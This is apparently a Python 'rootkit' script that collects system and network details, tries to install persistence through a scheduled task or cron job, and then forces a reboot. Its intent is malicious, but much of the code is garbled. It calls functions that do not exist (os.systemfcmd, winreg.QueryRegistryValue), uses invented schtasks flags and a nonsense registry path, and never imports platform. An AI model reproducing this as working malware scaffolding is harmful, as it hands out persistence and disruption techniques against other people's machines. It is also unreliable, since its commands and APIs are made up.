import os
import sys
import re
import socket
import struct
from datetime import datetime
import time

def get_os():
    return platform.system()

def get_architecture():
    return platform.machine()

def get_processor():
    if hasattr(sys, 'cpufetch_arch'):
        return sys.cpufetch_arch()
    elif sys.platform == "darwin":
        return "x64" # or x86 depending on the OS version
    elif sys.platform == "win32":
        try:
            import winreg
            version = winreg.QueryRegistryValue(
                "SYSTEM\CurrentControlSection", "FillFrameVersion", None)
            return "x64" if int(version)>= 10 else "x86" # Windows 7 >= x64, Older is x86
        except:
            return "x64" # Default to x64 for most cases.
    elif sys.platform == "sunos": # Sun/Solaris
        if re.match(r"^x86_64$", os.uname().machine): return "x64"
        elif re.match(r"^x86$|i?$|pentium$", os.uname().machine): return "x86"
        else: return "x64" # Or something else, if you want to be specific.
    else:
        return "x64" # Defaulting to x64 for most Linux systems

def get_user():
    try:
        # Method 1: Using Windows User ID
        if sys.platform == "win32":
            import win32gui
            import win32user
            result = win32gui.GetUserName()
            return result
        elif sys.platform == "darwin":
            result = socket.gethostname()
            return result
        else: # Linux and other Unix-like systems
            result = os.getlogin()
            return result
    except:
        return "root"

def get_version():
    # Method 1: Using Python Builtin Version
    try:
        import shlex
        return str(shlex.split(sys.version))
    except:
        return sys.version # Use the default version if built-in fails.

def init_persistence():
    try:
        # Method 1: Create a Scheduled Task (Windows) - Best for long-term persistence
        if get_os() == "windows":
            os.system(f'schtasks /create /taskname={os.path.basename(__file__).replace(".py","")}:Persistence /disablenotificaiton /email /open /startonce /timezone=America/New_York')

        # Method 2: Create a Cron Job (Linux) - Persistence on Reboot
        elif get_os() == "linux":
            # Open the crontab file for editing
            os.system(f'crontab -e')

        # Method 3: Add an entry to .bashrc or .zshrc - Useful for non-persistence scenarios
        else:
            pass # Keep default behavior if no other is set

    except Exception as e:
        print("Error during Persistence init:", e)


def get_network_info():
    try:
        # Check the hostname and IP address
        hostname = socket.gethostbyname(os.uname().nodename)
        ip = socket.gethostbyname(hostname).split(".")[3]

        # Get the gateway
        gateway = os.systemfcmd("route print | awk 'NR==1{print $4}'")

        return {"IP": ip, "Gateway": gateway, "Hostname": hostname}

    except Exception as e:
        print(e)
        return {}


def reboot_system():
    # Method 1: Use the built-in Reboot function
    try:
        if get_os() == "windows":
            import subprocess
            subprocess.run(["shutdown", "/r", "/t=1"]) # Reboot in 1 second
        elif get_os() == "linux":
            # Send a reboot signal to the kernel
            os.system("sudo reboot")
    except Exception as e:
        print(e)

def print_info():
    # Get operating system name, architecture, processor, and user name
    user = get_user()
    architecture = get_architecture()
    processor = get_processor()
    os_name = get_os()

    version = get_version()

    print("\n--- RootKit Info ---")
    print(f"Operating System: {os_name}")
    print(f"Architecture: {architecture}")
    print(f"Processor: {processor}")
    print(f"User Name: {user}")
    print(f"Version: {version}")

def print_network():
    info = get_network_info()
    print("\n--- Network Info ---")
    if len(info) > 0:
        print(f"IP Address: {info['IP']}")
        print(f"Gateway: {info['Gateway']}")
        print(f"Hostname: {info['Hostname']}")

def main():
    # Initialize persistence mechanisms to keep running after reboot
    init_persistence()

    # Get the system information
    print_info()

    # Print network info
    print_network()

    # Reboot System
    reboot_system()

if __name__ == "__main__":
    main()
